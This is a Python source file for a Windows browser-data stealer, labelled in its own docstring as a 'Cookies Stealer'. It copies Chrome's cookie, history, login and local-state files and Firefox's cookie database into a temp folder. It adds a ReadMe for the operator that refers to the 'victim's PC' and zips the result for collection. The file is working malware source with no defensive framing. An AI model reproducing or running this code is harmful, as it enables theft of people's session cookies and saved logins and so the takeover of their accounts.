import os, shutil, tempfile

class GetCookies:
    def start(self):
        """
        Chrome & Firefox Cookies Stealer, Saves the Cookies.zip in TEMP
        """
        tempdir = tempfile.gettempdir()
        
        os.chdir(tempdir)
        try:
            shutil.rmtree("Cookies")
        except:
            pass
        os.system("md Cookies Cookies\\Chrome Cookies\\Firefox")

        chrome_cookiepath1 = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network'
        chrome_cookiepath2 = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default'
        chrome_cookiepath3 = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Local\\Google\\Chrome\\User Data'
        chrome_destinationPath = tempdir + "\\Cookies\\Chrome"
        
        firefox_cookiedir = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles' 
        for path in os.listdir(firefox_cookiedir):
            if os.path.exists(firefox_cookiedir+"\\"+path+"\\cookies.sqlite"):
                firefox_cookiepath = firefox_cookiedir+"\\"+path+"\\cookies.sqlite"
                break
        firefox_destinationPath = tempdir + "\\Cookies\\Firefox"

        cookie = chrome_cookiepath1 + "\\Cookies"

        history     = chrome_cookiepath2 + "\\History"
        loginData   = chrome_cookiepath2 + "\\Login Data"
        login_state = chrome_cookiepath3 + "\\Local State"

        if os.path.exists(chrome_cookiepath1):
            shutil.copy2(cookie, chrome_destinationPath)
            shutil.copy2(history, chrome_destinationPath)
            shutil.copy2(loginData, chrome_destinationPath)
            shutil.copy2(login_state, chrome_destinationPath)
            
        if os.path.exists(firefox_cookiedir):
            shutil.copy2(firefox_cookiepath, firefox_destinationPath)   
        
        with open("Cookies/ReadMe.txt" , "w") as f:
            f.write("In Order To Import These Cookies, Just Copy & Paste Them At These Path: \n\n[For Chrome]\nC:/Users/USERNAME/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies\nC:/Users/USERNAME/AppData/Local/Google/Chrome/User Data/Default/History\nC:/Users/USERNAME/AppData/Local/Google/Chrome/User Data/Default/Login Data\nC:/Users/USERNAME/AppData/Local/Google/Chrome/User Data/Login State\n\n[For Firefox]\nC:/Users/USERNAME/AppData/Roaming/Mozilla/Firefox/Profiles/XXXXXXX.default/cookies.sqlite\n\n[Note]\nIf Cookies are not found in there respective folders then means that, that particular browser is not installed on victim's PC")

        shutil.make_archive("Cookies", "zip", "Cookies")    
        shutil.rmtree("Cookies")
        
        cookie_zip_path = tempdir + "\\Cookies.zip"
        
        return cookie_zip_path
        
if __name__ == '__main__':
    test = GetCookies()
    result = test.start()
    print(result)
